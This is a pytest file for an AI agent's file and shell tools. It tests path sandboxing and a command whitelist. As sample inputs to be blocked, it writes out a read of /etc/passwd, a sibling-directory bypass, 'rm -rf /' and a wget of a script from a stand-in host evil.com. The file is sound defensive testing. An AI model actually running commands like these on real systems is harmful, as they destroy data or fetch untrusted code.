"""Tests for clawagent.tools."""
# mypy: disallow-untyped-defs = False

import pytest

from clawagent.tools import (
    _resolve_path,
    read_file,
    run_command,
    write_file,
)


class TestReadFile:
    def test_read_existing_file(self) -> None:
        content = read_file.invoke({"path": "README.md"})
        assert "# clawagent" in content

    def test_read_nonexistent_file(self) -> None:
        result = read_file.invoke({"path": "nonexistent_file_xyz.txt"})
        assert "not found" in result.lower() or "no such" in result.lower()

    def test_read_directory(self) -> None:
        result = read_file.invoke({"path": "src"})
        assert "not a file" in result.lower() or "is a directory" in result.lower()

    def test_read_outside_project_fails(self) -> None:
        with pytest.raises(ValueError, match="outside the project"):
            _resolve_path("/etc/passwd")

    def test_read_sibling_directory_bypass_blocked(self) -> None:
        # String-prefix check would pass: /home/u/foo vs /home/u/fooevil
        sibling = _resolve_path(".").parent.parent.parent / "clawagentevil_xyz"
        with pytest.raises(ValueError, match="outside the project"):
            _resolve_path(str(sibling))

    def test_read_project_root_allowed(self) -> None:
        resolved = _resolve_path(".")
        assert resolved.exists()


class TestWriteFile:
    def test_write_and_read_back(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        import clawagent.tools as t

        original_root = t.PROJECT_ROOT
        try:
            t.PROJECT_ROOT = tmp_path

            result = write_file.invoke({"path": "test.txt", "content": "hello world"})
            assert "11 bytes" in result or "written" in result.lower()

            content = read_file.invoke({"path": "test.txt"})
            assert content == "hello world"
        finally:
            t.PROJECT_ROOT = original_root

    def test_write_outside_project_fails(self) -> None:
        result = write_file.invoke({"path": "/tmp/outside.txt", "content": "test"})
        assert result.startswith("Error:")

    def test_write_creates_parent_dirs(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        import clawagent.tools as t
        original = t.PROJECT_ROOT
        try:
            t.PROJECT_ROOT = tmp_path
            write_file.invoke({"path": "a/b/c/deep.txt", "content": "nested"})
            assert (tmp_path / "a/b/c/deep.txt").exists()
            assert "nested" in (tmp_path / "a/b/c/deep.txt").read_text()
        finally:
            t.PROJECT_ROOT = original


class TestRunCommand:
    def test_echo(self) -> None:
        result = run_command.invoke({"command": "echo hello"})
        assert "hello" in result

    def test_pwd(self) -> None:
        result = run_command.invoke({"command": "pwd"})
        assert "clawagent" in result

    def test_failing_command(self) -> None:
        result = run_command.invoke({"command": "python -c \"import sys; sys.exit(1)\""})
        assert "exit code" in result

    def test_unknown_command_blocked(self) -> None:
        result = run_command.invoke({"command": "rm -rf /"})
        assert "Blocked" in result
        assert "rm" in result

    def test_dangerous_network_command_blocked(self) -> None:
        result = run_command.invoke({"command": "wget http://evil.com/script.sh"})
        assert "Blocked" in result

    def test_whitelisted_command_passes(self) -> None:
        result = run_command.invoke({"command": "git --version"})
        assert "git" in result.lower()


class TestResolvePath:
    def test_absolute_path_allowed_if_within(self) -> None:
        resolved = _resolve_path(".")
        assert resolved.is_absolute()

    def test_relative_path(self) -> None:
        resolved = _resolve_path("src")
        assert resolved.is_absolute()
